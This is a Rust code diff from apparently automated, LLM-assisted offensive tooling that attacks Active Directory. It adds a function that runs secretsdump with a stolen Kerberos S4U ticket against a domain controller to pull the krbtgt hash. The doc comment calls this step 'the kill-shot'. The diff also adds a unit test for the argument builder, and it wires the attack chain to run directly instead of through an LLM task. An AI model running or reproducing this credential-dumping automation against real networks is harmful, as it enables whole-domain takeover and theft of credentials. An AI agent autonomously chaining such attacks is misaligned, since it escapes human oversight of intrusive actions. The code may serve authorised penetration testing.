@@ -55,7 +55,7 @@ fn parent_to_child_pth_dedup_key(child_dc_ip: &str, child_domain: &str) -> Strin
 /// Build krbtgt-extraction dedup key. Distinct from the generic PTH key
 /// (which is for full domain dumps) so a prior full-dump failure doesn't
 /// block the narrower `-just-dc-user krbtgt` attempt against the same DC.
-fn krbtgt_extraction_dedup_key(dc_ip: &str, domain: &str) -> String {
+pub(crate) fn krbtgt_extraction_dedup_key(dc_ip: &str, domain: &str) -> String {
     format!(
         "{}:{}:krbtgt_extraction_direct_v2",
         dc_ip,
@@ -225,6 +225,26 @@ fn build_krbtgt_extraction_args(dc_ip: &str, domain: &str, hash_value: &str) -> 
     })
 }
 
+fn build_krbtgt_extraction_ticket_args(
+    dc_ip: &str,
+    domain: &str,
+    username: &str,
+    ticket_path: &str,
+) -> Value {
+    json!({
+        "target": dc_ip,
+        "target_ip": dc_ip,
+        "dc_ip": dc_ip,
+        "username": username,
+        "domain": domain,
+        "target_domain": domain,
+        "ticket_path": ticket_path,
+        "no_pass": true,
+        "just_dc_user": "krbtgt",
+        "timeout_minutes": 3,
+    })
+}
+
 fn discoveries_include_krbtgt(discoveries: Option<&Value>, domain: &str) -> bool {
     let dom = domain.to_lowercase();
     discoveries
@@ -302,6 +322,77 @@ async fn dispatch_krbtgt_extraction_direct(
                 dc = %dc_ip,
                 domain = %domain,
                 "Failed to dispatch direct krbtgt extraction"
+            );
+            false
+        }
+    }
+}
+
+/// Dispatches `secretsdump -k -no-pass -just-dc-user krbtgt` against a DC
+/// using a Kerberos `.ccache` ticket — the kill-shot after a successful
+/// constrained-delegation S4U lands a CIFS ticket as Administrator on a DC.
+///
+/// Called inline by `auto_chain_s4u_secretsdump` (result_processing) so the
+/// chain runs directly instead of enqueueing an LLM `credential_access` task
+/// that may drop `-just-dc-user`, mis-shape the ticket env, or omit
+/// `-no-pass`. Returns `true` when discoveries report a krbtgt hash for
+/// `domain`.
+pub(crate) async fn dispatch_krbtgt_extraction_with_ticket(
+    dispatcher: &Dispatcher,
+    dc_ip: &str,
+    domain: &str,
+    username: &str,
+    ticket_path: &str,
+) -> bool {
+    let task_id = format!("krbtgt_extract_s4u_{}", uuid::Uuid::new_v4().simple());
+    let call = ToolCall {
+        id: format!("{}_call", task_id),
+        name: "secretsdump".to_string(),
+        arguments: build_krbtgt_extraction_ticket_args(dc_ip, domain, username, ticket_path),
+    };
+
+    info!(
+        task_id = %task_id,
+        dc = %dc_ip,
+        domain = %domain,
+        username = %username,
+        ticket = %ticket_path,
+        "krbtgt extraction dispatched (direct tool, S4U ticket, just-dc-user krbtgt)"
+    );
+
+    match dispatcher
+        .llm_runner
+        .tool_dispatcher()
+        .dispatch_tool("credential_access", &task_id, &call)
+        .await
+    {
+        Ok(result) => {
+            let found = discoveries_include_krbtgt(result.discoveries.as_ref(), domain);
+            if found {
+                info!(
+                    task_id = %task_id,
+                    dc = %dc_ip,
+                    domain = %domain,
+                    "krbtgt extraction via S4U ticket completed with parsed krbtgt hash"
+                );
+            } else {
+                warn!(
+                    task_id = %task_id,
+                    dc = %dc_ip,
+                    domain = %domain,
+                    error = ?result.error,
+                    output_len = result.output.len(),
+                    "krbtgt extraction via S4U ticket completed without parsed krbtgt hash"
+                );
+            }
+            found
+        }
+        Err(e) => {
+            warn!(
+                err = %e,
+                dc = %dc_ip,
+                domain = %domain,
+                "Failed to dispatch S4U-ticket krbtgt extraction"
             );
             false
         }
@@ -687,6 +778,29 @@ mod tests {
         );
         assert_eq!(args["just_dc_user"], "krbtgt");
         assert_eq!(args["timeout_minutes"], 3);
+    }
+
+    #[test]
+    fn build_krbtgt_extraction_ticket_args_carries_ticket_and_no_pass() {
+        let args = build_krbtgt_extraction_ticket_args(
+            "192.168.58.20",
+            "contoso.local",
+            "Administrator",
+            "/tmp/Administrator@CIFS_dc01@CONTOSO.LOCAL.ccache",
+        );
+        assert_eq!(args["target"], "192.168.58.20");
+        assert_eq!(args["target_ip"], "192.168.58.20");
+        assert_eq!(args["dc_ip"], "192.168.58.20");
+        assert_eq!(args["username"], "Administrator");
+        assert_eq!(args["domain"], "contoso.local");
+        assert_eq!(args["target_domain"], "contoso.local");
+        assert_eq!(
+            args["ticket_path"],
+            "/tmp/Administrator@CIFS_dc01@CONTOSO.LOCAL.ccache"
+        );
+        assert_eq!(args["no_pass"], true);
+        assert_eq!(args["just_dc_user"], "krbtgt");
+        assert!(args.get("hash").is_none(), "must not carry an NTLM hash");
     }
 
     #[test]
